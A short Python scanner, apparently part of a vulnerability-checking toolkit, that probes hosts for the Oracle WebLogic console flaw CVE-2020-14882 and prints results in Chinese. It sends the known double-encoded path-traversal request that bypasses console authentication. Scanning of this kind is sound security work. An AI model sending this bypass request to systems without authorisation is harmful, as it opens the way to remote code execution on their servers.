import requests
import urllib3
urllib3.disable_warnings()


index = "CVE_2020_14882"

headers = {
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Content-Type": "text/xml",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36"
}


def start(ip, port):
    req_url = f"http://{ip}:{port}/console/css/%252e%252e%252fconsole.portal"
    fragile = False
    try:
        req = requests.Session()
        if req.get(req_url, headers=headers).status_code == 200:
            fragile = True
    except Exception as ex:
        pass

    if fragile:
        print(f"[*] {ip}:{port} 存在Oracle Weblogic Console HTTP 协议远程代码执行漏洞,CVE编号[{index}]")
    else:
        print(f"[ ] {ip}:{port} 未检测到[{index}]漏洞")

